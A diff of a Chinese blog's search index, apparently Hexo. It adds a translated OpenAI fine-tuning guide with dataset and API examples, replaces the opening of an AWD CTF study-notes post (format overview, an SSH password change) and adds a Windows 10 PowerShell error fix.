+<p>假设您希望确保您网站上的广告文字提及正确的产品和公司。换句话说，您要确保模型没有胡编乱造。您可能想要微调过滤掉不正确广告的分类器。</p>
+<p>数据集可能类似于以下内容：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span><span class="string">&quot;Company: BHFF insurance\nProduct: allround insurance\nAd:One stop shop for all your insurance needs!\nSupported:&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span><span class="string">&quot; yes&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span><span class="string">&quot;Company: Loft conversion specialists\nProduct: -\nAd:Straight teeth in weeks!\nSupported:&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span><span class="string">&quot; no&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>在上面的示例中，我们使用了包含公司名称、产品和相关广告的结构化输入。作为分隔符，我们使用<code>\nSupported:</code>它清楚地将提示与完成分开。对于足够数量的示例，分隔符不会产生太大影响（通常小于 0.4%），只要它没有出现在提示或完成中即可。</p>
+<p>对于这个用例，我们微调了一个 ada 模型，因为它会更快、更便宜，而且性能将与更大的模型相当，因为它是一个分类任务。</p>
+<p>现在我们可以通过发出完成请求来查询我们的模型。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://api.openai.com/v1/completions \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Authorization: Bearer <span class="variable">$OPENAI_API_KEY</span>&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;prompt&quot;: &quot;Company: Reliable accountants Ltd\nProduct: Personal Tax help\nAd:Best advice in town!\nSupported:&quot;,</span></span><br><span class="line"><span class="string">    &quot;max_tokens&quot;: 1,</span></span><br><span class="line"><span class="string">    &quot;model&quot;: &quot;YOUR_FINE_TUNED_MODEL_NAME&quot;</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>哪个将返回<code> yes</code>or <code>no</code>。</p>
+<p><strong>案例研究：情绪分析</strong></p>
+<p>假设您想要了解特定推文的正面或负面程度。数据集可能类似于以下内容：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span><span class="string">&quot;Overjoyed with the new iPhone! -&gt;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span><span class="string">&quot; positive&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span><span class="string">&quot;@lakers disappoint for a third straight night https://t.co/38EFe43 -&gt;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span><span class="string">&quot; negative&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>对模型进行微调后，您可以通过在<code>logprobs=2</code>完成请求上设置来取回第一个完成令牌的对数概率。正类别的概率越高，相对情绪就越高。</p>
+<p>现在我们可以通过发出完成请求来查询我们的模型。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://api.openai.com/v1/completions \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Authorization: Bearer <span class="variable">$OPENAI_API_KEY</span>&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;prompt&quot;: &quot;https://t.co/f93xEd2 Excited to share my latest blog post! -&gt;&quot;,</span></span><br><span class="line"><span class="string">    &quot;max_tokens&quot;: 1,</span></span><br><span class="line"><span class="string">    &quot;model&quot;: &quot;YOUR_FINE_TUNED_MODEL_NAME&quot;</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>哪个将返回：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cmpl-COMPLETION_ID&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text_completion&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;created&quot;</span><span class="punctuation">:</span> <span class="number">1589498378</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;model&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YOUR_FINE_TUNED_MODEL_NAME&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;choices&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;logprobs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;text_offset&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="number">19</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;token_logprobs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="number">-0.03597255</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tokens&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot; positive&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;top_logprobs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot; negative&quot;</span><span class="punctuation">:</span> <span class="number">-4.9785037</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot; positive&quot;</span><span class="punctuation">:</span> <span class="number">-0.03597255</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot; positive&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;finish_reason&quot;</span><span class="punctuation">:</span> <span class="string">&quot;length&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>案例研究：电子邮件分类的分类</strong></p>
+<p>假设您希望将收到的电子邮件归入大量预定义类别之一。对于大量类别的分类，我们建议您将这些类别转换为数字，最多可处理约 500 个类别。我们观察到，由于标记化，在数字前添加一个空格有时会对性能略有帮助。您可能希望按如下方式构建训练数据：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span><span class="string">&quot;Subject: &lt;email_subject&gt;\nFrom:&lt;customer_name&gt;\nDate:&lt;date&gt;\nContent:&lt;email_body&gt;\n\n###\n\n&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span><span class="string">&quot; &lt;numerical_category&gt;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span><span class="string">&quot;Subject: Update my address\nFrom:Joe Doe\nTo:support@ourcompany.com\nDate:2021-06-03\nContent:Hi,\nI would like to update my billing address to match my delivery address.\n\nPlease let me know once done.\n\nThanks,\nJoe\n\n###\n\n&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span><span class="string">&quot; 4&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>在上面的示例中，我们使用了一封上限为 2043 个令牌的传入电子邮件作为输入。（这允许使用 4 个标记分隔符和一个标记完成，总计为 2048。）作为分隔符，我们使用并删除了电子邮件中<code>\n\n###\n\n</code>出现的所有内容。<code>###</code></p>
+<p><strong>条件生成</strong></p>
+<p>条件生成是需要在给定某种输入的情况下生成内容的问题。这包括释义、总结、实体提取、编写给定规范的产品描述、聊天机器人等。对于此类问题，我们建议：</p>
+<ul>
+<li>在提示末尾使用分隔符，例如<code>\n\n###\n\n</code>. 当您最终向您的模型发出请求时，请记住还要附加此分隔符。</li>
+<li>在完成结束时使用结束标记，例如<code> END</code></li>
+<li>请记住在推理过程中将结束标记添加为停止序列，例如<code>stop=[&quot; END&quot;]</code></li>
+<li>目标是至少 ~500 个示例</li>
+<li>确保提示+完成不超过 2048 个标记，包括分隔符</li>
+<li>确保示例具有高质量并遵循相同的所需格式</li>
+<li>确保用于微调的数据集在结构和任务类型上与模型将用于的数据集非常相似</li>
+<li>使用较低的学习率和仅 1-2 个时期往往更适合这些用例</li>
+</ul>
+<hr>
+<p><strong>案例研究：根据维基百科文章撰写引人入胜的广告</strong></p>
+<p>这是一个生成用例，因此您需要确保提供的样本具有最高质量，因为微调模型将尝试模仿给定示例的风格（和错误）。一个好的起点是大约 500 个示例。示例数据集可能如下所示：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span><span class="string">&quot;&lt;Product Name&gt;\n&lt;Wikipedia description&gt;\n\n###\n\n&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span><span class="string">&quot; &lt;engaging ad&gt; END&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span><span class="string">&quot;Samsung Galaxy Feel\nThe Samsung Galaxy Feel is an Android smartphone developed by Samsung Electronics exclusively for the Japanese market. The phone was released in June 2017 and was sold by NTT Docomo. It runs on Android 7.0 (Nougat), has a 4.7 inch display, and a 3000 mAh battery.\nSoftware\nSamsung Galaxy Feel runs on Android 7.0 (Nougat), but can be later updated to Android 8.0 (Oreo).\nHardware\nSamsung Galaxy Feel has a 4.7 inch Super AMOLED HD display, 16 MP back facing and 5 MP front facing cameras. It has a 3000 mAh battery, a 1.6 GHz Octa-Core ARM Cortex-A53 CPU, and an ARM Mali-T830 MP1 700 MHz GPU. It comes with 32GB of internal storage, expandable to 256GB via microSD. Aside from its software and hardware specifications, Samsung also introduced a unique a hole in the phone&#x27;s shell to accommodate the Japanese perceived penchant for personalizing their mobile phones. The Galaxy Feel&#x27;s battery was also touted as a major selling point since the market favors handsets with longer battery life. The device is also waterproof and supports 1seg digital broadcasts using an antenna that is sold separately.\n\n###\n\n&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span><span class="string">&quot;Looking for a smartphone that can do it all? Look no further than Samsung Galaxy Feel! With a slim and sleek design, our latest smartphone features high-quality picture and video capabilities, as well as an award winning battery life. END&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里我们使用了多行分隔符，因为维基百科文章包含多个段落和标题。我们还使用了一个简单的结束标记，以确保模型知道何时应该完成完成。</p>
+<p><strong>案例研究：实体提取</strong></p>
+<p>这类似于语言转换任务。为了提高性能，最好按字母顺序或按照它们在原始文本中出现的相同顺序对不同的提取实体进行排序。这将有助于模型跟踪需要按顺序生成的所有实体。数据集可能如下所示：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span><span class="string">&quot;&lt;any text, for example news article&gt;\n\n###\n\n&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span><span class="string">&quot; &lt;list of entities, separated by a newline&gt; END&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span><span class="string">&quot;Portugal will be removed from the UK&#x27;s green travel list from Tuesday, amid rising coronavirus cases and concern over a \&quot;Nepal mutation of the so-called Indian variant\&quot;. It will join the amber list, meaning holidaymakers should not visit and returnees must isolate for 10 days...\n\n###\n\n&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span><span class="string">&quot; Portugal\nUK\nNepal mutation\nIndian variant END&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>多行分隔符效果最好，因为文本可能包含多行。理想情况下，输入提示的类型会高度多样化（新闻文章、维基百科页面、推文、法律文件），这反映了提取实体时可能遇到的文本。</p>
+<p><strong>案例研究：客户支持聊天机器人</strong></p>
+<p>聊天机器人通常会包含有关对话的相关上下文（订单详细信息）、到目前为止的对话摘要以及最近的消息。对于这个用例，相同的过去对话可以在数据集中生成多行，每次都有稍微不同的上下文，对于每个代理生成作为完成。这个用例将需要几千个示例，因为它可能会处理不同类型的请求和客户问题。为确保高质量的性能，我们建议审查对话样本以确保代理消息的质量。可以使用单独的文本转换微调模型生成摘要。数据集可能如下所示：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span><span class="string">&quot;Summary: &lt;summary of the interaction so far&gt;\n\nSpecific information:&lt;for example order details in natural language&gt;\n\n###\n\nCustomer: &lt;message1&gt;\nAgent: &lt;response1&gt;\nCustomer: &lt;message2&gt;\nAgent:&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span><span class="string">&quot; &lt;response2&gt;\n&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span><span class="string">&quot;Summary: &lt;summary of the interaction so far&gt;\n\nSpecific information:&lt;for example order details in natural language&gt;\n\n###\n\nCustomer: &lt;message1&gt;\nAgent: &lt;response1&gt;\nCustomer: &lt;message2&gt;\nAgent: &lt;response2&gt;\nCustomer: &lt;message3&gt;\nAgent:&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span><span class="string">&quot; &lt;response3&gt;\n&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这里，我们有意分离不同类型的输入信息，但在提示和完成之间以相同的格式维护客户代理对话框。所有的完成都应该只由代理完成，我们可以<code>\n</code>在进行推理时用作停止序列。</p>
+<p><strong>案例研究：基于技术属性列表的产品描述</strong></p>
+<p>在这里，将输入数据转换为自然语言很重要，这可能会带来卓越的性能。例如，以下格式：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span><span class="string">&quot;Item=handbag, Color=army_green, price=$99, size=S-&gt;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span><span class="string">&quot; This stylish small green handbag will add a unique touch to your look, without costing you a fortune.&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>不会像以下那样工作：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span><span class="string">&quot;Item is a handbag. Colour is army green. Price is midrange. Size is small.-&gt;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span><span class="string">&quot; This stylish small green handbag will add a unique touch to your look, without costing you a fortune.&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>为了获得高性能，请确保完成是基于所提供的描述。如果经常查阅外部内容，则以自动方式添加此类内容将提高性能。如果描述基于图像，则使用算法提取图像的文本描述可能会有所帮助。由于完成只有一个句子长，我们可以<code>.</code>在推理过程中用作停止序列。</p>
+<h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><p><strong>自定义您的模型名称</strong></p>
+<p><a href="https://platform.openai.com/docs/api-reference/fine-tunes/create#fine-tunes/create-suffix">您可以使用后缀</a>参数将最多 40 个字符的后缀添加到经过微调的模型名称中。</p>
+<p>OpenAI 命令行界面：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openai api fine_tunes.create -t test.jsonl -m ada --suffix <span class="string">&quot;custom model name&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果名称将是：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ada:ft-your-org:custom-model-name-2022-02-15-04-21-04</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析您的微调模型</strong></p>
+<p>我们会在每个作业完成后附上一个结果文件。当您检索微调时以及查看微调中的事件时，将列出此结果文件 ID。您可以下载这些文件：</p>
+<p>OpenAI 命令行界面：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openai api fine_tunes.results -i &lt;YOUR_FINE_TUNE_JOB_ID&gt;</span><br></pre></td></tr></table></figure>
+
+<p>卷曲：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">curl https://api.openai.com/v1/files/$RESULTS_FILE_ID/content \</span><br><span class="line">  -H &quot;Authorization: Bearer $OPENAI_API_KEY&quot; &gt; results.csv</span><br></pre></td></tr></table></figure>
+
+<p>该<code>_results.csv</code>文件为每个训练步骤包含一行，其中一个步骤是指对一批数据的一次前向和反向传递。除步骤编号外，每行还包含与该步骤对应的以下字段：</p>
+<ul>
+<li><strong>elapsed_tokens</strong>：模型到目前为止已经看到的令牌数（包括重复）</li>
+<li><strong>elapsed_examples</strong>：模型到目前为止已经看到的示例数量（包括重复），其中一个示例是您的批次中的一个元素。例如，如果<code>batch_size = 4</code>，每一步将增加<code>elapsed_examples</code>4。</li>
+<li><strong>training_loss</strong>：训练批次的损失</li>
+<li><strong>training_sequence_accuracy</strong> ：训练批次中模型的预测标记与真实完成标记完全匹配的<strong>完成</strong>百分比。例如，如果 a 为<code>batch_size</code>3，如果您的数据包含补全 [ [1, 2] , [0, 5] , [4, 2] ] 和模型预测 [ [1, 1] , [0, 5] ，[4, 2] ]，这个准确度将是 2/3 = 0.67</li>
+<li><strong>training_token_accuracy</strong>：模型正确预测的训练批次中标记的<strong>百分比。</strong>例如，如果 a 为<code>batch_size</code>3，如果您的数据包含补全 [ [1, 2] , [0, 5] , [4, 2] ] 和模型预测 [ [1, 1] , [0, 5] ，[4, 2] ]，这个准确度将是 5/6 = 0.83</li>
+</ul>
+<p><strong>分类特定指标</strong></p>
+<p>我们还提供了在结果文件中生成其他特定于分类的指标的选项，例如准确性和加权 F1 分数。这些指标是根据完整的验证集和微调结束时定期计算的。您将在结果文件中看到它们作为附加列。</p>
+<p>要启用此功能，请设置参数<code>--compute_classification_metrics</code>。此外，您必须提供一个验证文件，并<code>classification_n_classes</code>为多类分类设置参数，或<code>classification_positive_class</code>为二元分类设置参数。</p>
+<p>OpenAI 命令行界面：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># For multiclass classification</span></span><br><span class="line">openai api fine_tunes.create \</span><br><span class="line">  -t &lt;TRAIN_FILE_ID_OR_PATH&gt; \</span><br><span class="line">  -v &lt;VALIDATION_FILE_OR_PATH&gt; \</span><br><span class="line">  -m &lt;MODEL&gt; \</span><br><span class="line">  --compute_classification_metrics \</span><br><span class="line">  --classification_n_classes &lt;N_CLASSES&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># For binary classification</span></span><br><span class="line">openai api fine_tunes.create \</span><br><span class="line">  -t &lt;TRAIN_FILE_ID_OR_PATH&gt; \</span><br><span class="line">  -v &lt;VALIDATION_FILE_OR_PATH&gt; \</span><br><span class="line">  -m &lt;MODEL&gt; \</span><br><span class="line">  --compute_classification_metrics \</span><br><span class="line">  --classification_n_classes 2 \</span><br><span class="line">  --classification_positive_class &lt;POSITIVE_CLASS_FROM_DATASET&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果您设置以下指标将显示在您的<a href="https://platform.openai.com/docs/guides/fine-tuning/analyzing-your-fine-tuned-model">结果文件</a><code>--compute_classification_metrics</code>中：</p>
+<p><strong>对于多类分类</strong></p>
+<ul>
+<li><strong>分类/准确度</strong>：准确度</li>
+<li><strong>classification/weighted_f1_score</strong> : 加权 F-1 分数</li>
+</ul>
+<p><strong>对于二进制分类</strong></p>
+<p>以下指标基于 0.5 的分类阈值（即当概率 &gt; 0.5 时，示例被分类为属于正类。）</p>
+<ul>
+<li><strong>分类/准确度</strong></li>
+<li><strong>分类/精度</strong></li>
+<li><strong>分类/召回</strong></li>
+<li><strong>分类/f{beta}</strong></li>
+<li><strong>分类/auroc</strong> - AUROC</li>
+<li><strong>分类/auprc</strong> - AUPRC</li>
+</ul>
+<p>请注意，这些评估假设您正在为将标记化为单个标记的类使用文本标签，如上所述。如果这些条件不成立，您得到的数字很可能是错误的。</p>
+<p><strong>验证</strong></p>
+<p>您可以保留一些数据以供验证。验证文件与训练文件具有完全相同的格式，并且您的训练数据和验证数据应该互斥。</p>
+<p>如果您在创建微调作业时包含验证文件，则生成的结果文件将包括对微调模型在训练期间定期对验证数据执行情况的评估。</p>
+<p>OpenAI 命令行界面：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openai api fine_tunes.create -t &lt;TRAIN_FILE_ID_OR_PATH&gt; \</span><br><span class="line">  -v &lt;VALIDATION_FILE_ID_OR_PATH&gt; \</span><br><span class="line">  -m &lt;MODEL&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果您提供了验证文件，我们会在训练期间定期计算批量验证数据的指标。您将在结果文件中看到以下附加指标：</p>
+<ul>
+<li><strong>validation_loss</strong>：验证批次的损失</li>
+<li><strong>validation_sequence_accuracy</strong>：验证批次中模型的预测标记与真实完成标记完全匹配的完成百分比。例如，如果 a 为<code>batch_size</code>3，如果您的数据包含完成 [ [1, 2] , [0, 5] , [4, 2] ] 和模型预测 [ [1, 1] , [0, 5] ，[4, 2] ]，这个准确度将是 2/3 = 0.67</li>
+<li><strong>validation_token_accuracy</strong>：模型正确预测的验证批次中标记的百分比。例如，如果 a 为<code>batch_size</code>3，如果您的数据包含完成 [ [1, 2] , [0, 5] , [4, 2] ] 和模型预测 [ [1, 1] , [0, 5] ，[4, 2] ]，这个准确度将是 5/6 = 0.83</li>
+</ul>
+<p><strong>超参数</strong></p>
+<p>我们选择了适用于一系列用例的默认超参数。唯一需要的参数是训练文件。</p>
+<p>也就是说，调整用于微调的超参数通常可以产生产生更高质量输出的模型。特别是，您可能需要配置以下内容：</p>
+<ul>
+<li><code>model</code>：要微调的基本模型的名称。您可以选择“ada”、“babbage”、“curie”或“davinci”之一。要了解有关这些模型的更多信息，请参阅<a href="https://platform.openai.com/docs/models">模型</a>文档。</li>
+<li><code>n_epochs</code>- 默认为 4。训练模型的时期数。一个纪元指的是训练数据集的一个完整周期。</li>
+<li><code>batch_size</code>- 默认为训练集中示例数量的 0.2%，上限为 256。批量大小是用于训练单个正向和反向传递的训练示例数。总的来说，我们发现更大的批次大小往往更适用于更大的数据集。</li>
+<li><code>learning_rate_multiplier</code>- 默认为 0.05、0.1 或 0.2，具体取决于 final <code>batch_size</code>。微调学习率是用于预训练的原始学习率乘以该乘数。我们建议使用 0.02 到 0.2 范围内的值进行试验，以查看产生最佳结果的值。根据经验，我们发现较大的学习率通常在较大的批量大小下表现更好。</li>
+<li><code>compute_classification_metrics</code>- 默认为假。如果为 True，为了对分类任务进行微调，在每个 epoch 结束时在验证集上计算特定于分类的指标（准确性、F-1 分数等）。</li>
+</ul>
+<p>要配置这些额外的超参数，请通过 OpenAI CLI 上的命令行标志传递它们，例如：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openai api fine_tunes.create \</span><br><span class="line">  -t file-JD89ePi5KMsB3Tayeli5ovfW \</span><br><span class="line">  -m ada \</span><br><span class="line">  --n_epochs 1</span><br></pre></td></tr></table></figure>
+
+<p><strong>从微调模型继续微调</strong></p>
+<p>如果您已经为您的任务微调了一个模型，并且现在有您想要合并的额外训练数据，您可以从模型继续微调。这将创建一个从所有训练数据中学习的模型，而无需从头开始重新训练。</p>
+<p>为此，请在创建新的微调作业时传入微调后的模型名称（例如<code>-m curie:ft-&lt;org&gt;-&lt;date&gt;</code>）。其他训练参数不必更改，但是如果您的新训练数据比以前的训练数据小得多，您可能会发现减少<code>learning_rate_multiplier</code>2 到 4 倍很有用。</p>
+]]></content>
+      <categories>
+        <category>人工智能</category>
+      </categories>
+      <tags>
+        <tag>ChatGPT</tag>
       </tags>
   </entry>
   <entry>
@@ -211,222 +1243,17 @@
       </tags>
   </entry>
   <entry>
-    <title>AWD学习日记一</title>
-    <url>/posts/2fe68c90.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>AWD到时方恨不会，进一年两年没有打线下赛了，脚本也没有了，工具也没有。赶紧跟着大佬复习一波，做一下笔记。</p>
-<h1 id="关于AWD"><a href="#关于AWD" class="headerlink" title="关于AWD"></a>关于AWD</h1><p><strong>AWD</strong>: Attack With Defence，一般比赛中每个队伍维护两台服务器，一个web和一个pwn。web服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。</p>
-<ul>
-<li>战队有自己的初始分数；</li>
-<li>flag在主办方的设定下每隔一定时间，时间一般5-10分钟刷新一轮；</li>
-<li>其他队伍提交你的flag，你的队伍扣分，他加分；</li>
-<li>动态积分制，每一轮的分数会下降，直到最低；</li>
-<li>主办方会对每个队伍的网站或服务进行check，服务宕机扣除本轮flag分数；</li>
-<li>战队不能攻击主办方</li>
-<li>一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）；</li>
-<li>分配的pwn服务器，服务器多为ubantu，需要本地提权后再用户提权。</li>
-</ul>
-<ol>
-<li>域渗透：也可以叫内网渗透，Windows AD 域环境，更贴近实战</li>
-<li>高地模式：每只队伍服务器可以访问，没有权限，需要自己去获取权限。同时存在高地服务器，不属于任何一支队伍，每只队伍竞争高地服务器权限。</li>
-</ol>
-<p>详细参考：<a href="https://ctf-wiki.github.io/ctf-wiki/introduction/mode/#-attack-defense">https://ctf-wiki.github.io/ctf-wiki/introduction/mode/#-attack-defense</a></p>
-<hr>
-<h1 id="Attack-With-Defence"><a href="#Attack-With-Defence" class="headerlink" title="Attack With Defence"></a>Attack With Defence</h1><p>回忆过去的经验，打AWD比赛有几点需要注意：</p>
-<ul>
-<li>准备好一些自己熟悉常用的脚本，最起码是练习时可以使用的</li>
-<li>漏洞搜索能力，主办方出题都估计是现有漏洞，有本事0day也可以属于你</li>
-<li>快速反应能力与代码编写能力</li>
-</ul>
-<h2 id="修改ssh密码"><a href="#修改ssh密码" class="headerlink" title="修改ssh密码"></a>修改ssh密码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd username</span><br><span class="line"><span class="comment"># 输入密码确认即可</span></span><br></pre></td></tr></table></figure>
+    <title>win10报错</title>
+    <url>/posts/9ffa43eb.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在使用计算机时，因为我们自己的骚操作会产生一些奇奇怪怪的报错。因此特此积累一下自己所遇到的报错。也方便自己下次可以自己解决，也方便他人解决。</p>
+<h1 id="各种报错"><a href="#各种报错" class="headerlink" title="各种报错"></a>各种报错</h1><h2 id="Windows-PowerShell"><a href="#Windows-PowerShell" class="headerlink" title="Windows PowerShell"></a>Windows PowerShell</h2><h3 id="显示找不到快捷文件"><a href="#显示找不到快捷文件" class="headerlink" title="显示找不到快捷文件"></a>显示找不到快捷文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将C盘用户里面Default”这个用户（win10系统的默认账号）的Windows PowerShell复制到你的用下相同的目录下即可。</span><br><span class="line"></span><br><span class="line">目录</span><br><span class="line">C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
